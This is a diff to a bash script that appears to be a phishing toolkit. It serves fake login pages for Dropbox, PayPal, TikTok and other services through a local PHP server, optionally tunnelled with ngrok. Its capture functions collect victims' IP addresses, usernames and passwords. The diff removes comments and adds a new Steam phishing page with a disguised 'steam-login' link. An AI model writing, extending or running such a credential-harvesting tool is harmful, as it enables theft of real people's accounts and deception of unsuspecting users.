@@ -5,7 +5,7 @@ BLUE="$(printf '\033[34m')"
 CYAN="$(printf '\033[36m')"
 WHITE="$(printf '\033[37m')"
 
-## Directories
+
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
@@ -16,7 +16,7 @@ else
 	mkdir -p ".server/www"
 fi
 
-## Script termination
+
 exit_on_signal_SIGINT() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
     exit 0
@@ -30,14 +30,14 @@ exit_on_signal_SIGTERM() {
 trap exit_on_signal_SIGINT SIGINT
 trap exit_on_signal_SIGTERM SIGTERM
 
-## Reset terminal colors
+
 reset_color() {
-	tput sgr0   # reset attributes
-	tput op     # reset color
+	tput sgr0
+	tput op
     return
 }
 
-## Kill already running process
+
 kill_pid() {
 	if [[ `pidof php` ]]; then
 		killall php > /dev/null 2>&1
@@ -47,7 +47,7 @@ kill_pid() {
 	fi	
 }
 
-## Banner
+
 banner() {
 	cat <<- EOF
 		${RED}  _   _   _   _   _   _   _   _   _  
@@ -59,7 +59,7 @@ banner() {
 	EOF
 }
 
-## Small Banner
+
 banner_small() {
 	cat <<- EOF
 		${RED}  _   _   _   _   _   _   _   _   _  
@@ -70,7 +70,7 @@ banner_small() {
 	EOF
 }
 
-## Dependencies
+
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 
@@ -109,7 +109,7 @@ dependencies() {
 	fi
 }
 
-## Download Ngrok
+
 download_ngrok() {
 	url="$1"
 	file=`basename $url`
@@ -128,7 +128,7 @@ download_ngrok() {
 	fi
 }
 
-## Install ngrok
+
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
@@ -148,14 +148,14 @@ install_ngrok() {
 
 }
 
-## Exit message
+
 msg_exit() {
 	{ clear; banner; echo; }
 	echo -e "${GREENBG}${BLACK} Thank you for using this tool, have a good day.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
-## About
+
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
@@ -179,7 +179,7 @@ about() {
 	fi
 }
 
-## Setup website and start php server
+
 HOST='127.0.0.1'
 PORT='8080'
 
@@ -191,7 +191,7 @@ setup_site() {
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
-## Get IP address
+
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
@@ -200,7 +200,7 @@ capture_ip() {
 	cat .server/www/ip.txt >> ip.txt
 }
 
-## Get credentials
+
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
@@ -212,7 +212,7 @@ capture_creds() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
-## Print data
+
 capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
@@ -231,7 +231,7 @@ capture_data() {
 	done
 }
 
-## Start ngrok
+
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
@@ -251,7 +251,7 @@ start_ngrok() {
 	capture_data
 }
 
-## Start localhost
+
 start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
@@ -260,7 +260,7 @@ start_localhost() {
 	capture_data
 }
 
-## Tunnel selection
+
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
@@ -377,6 +377,7 @@ main_menu() {
 		${RED}[${WHITE}05${RED}]${CYAN} Dropbox
 		${RED}[${WHITE}06${RED}]${CYAN} PayPal
 		${RED}[${WHITE}07${RED}]${CYAN} TikTok
+		${RED}[${WHITE}08${RED}]${CYAN} Steam
 		
 		${RED}[${WHITE}99${RED}]${CYAN} About
 		${RED}[${WHITE}00${RED}]${CYAN} Exit
@@ -406,6 +407,10 @@ main_menu() {
 		website="tiktok"
 		mask='https://tiktok-login'
 		tunnel_menu
+	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
+		website="steam"
+		mask='https://steam-login'
+		tunnel_menu
 	elif [[ "$REPLY" == 99 ]]; then
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
@@ -416,7 +421,7 @@ main_menu() {
 	fi
 }
 
-## Main
+
 kill_pid
 dependencies
 install_ngrok
